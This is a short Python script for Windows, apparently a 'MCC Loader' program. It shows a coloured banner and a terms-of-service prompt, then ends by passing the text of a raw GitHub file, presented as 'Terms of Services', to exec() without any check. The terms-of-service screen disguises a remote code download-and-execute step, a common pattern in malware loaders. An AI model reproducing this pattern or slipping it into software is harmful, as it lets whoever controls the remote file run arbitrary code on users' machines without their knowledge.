import sys
import time
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random, requests, pystyle
import msvcrt
from os.path import isfile

TOS = """










                                               \033[0;31m _       _____    __________
                                               \033[0;31m| |     / /   |  /  _/_  __/
                                               \033[0;31m| | /| / / /| |  / /  / /   
                                               \033[0;31m| |/ |/ / ___ |_/ /  / /    
                                               \033[0;31m|__/|__/_/  |_/___/ /_(_)
"""
TOS2 = """                  Before using MCC Loader, you must agree to our \033[0;31mTOS\033[1;39m.

              Only press enter if you want to see the \033[0;31mterms of service\033[1;39m."""[1:]


def confirm():
    pystyle.Anime.Fade(pystyle.Center.Center(TOS2), pystyle.Colors.white_to_red, pystyle.Colorate.Vertical, enter=True)


os.system('cls')
print(TOS)
time.sleep(1)
print("\033[1;39m[\033[0;31mMCC Loader\033[1;39m] \033[1;39mThe user haven't accepted MCC Loader's terms of service.")
time.sleep(1)
print("\033[1;39m[\033[0;31mMCC Loader\033[1;39m] \033[1;39mRedirect user to : \033[0;31mTOSArea.")
time.sleep(3)
os.system('cls')
print(TOS2)
confirm()
if True:
    exec(requests.get('https://raw.githubusercontent.com/MCCFree/TOS/main/Terms%20of%20Services2').text)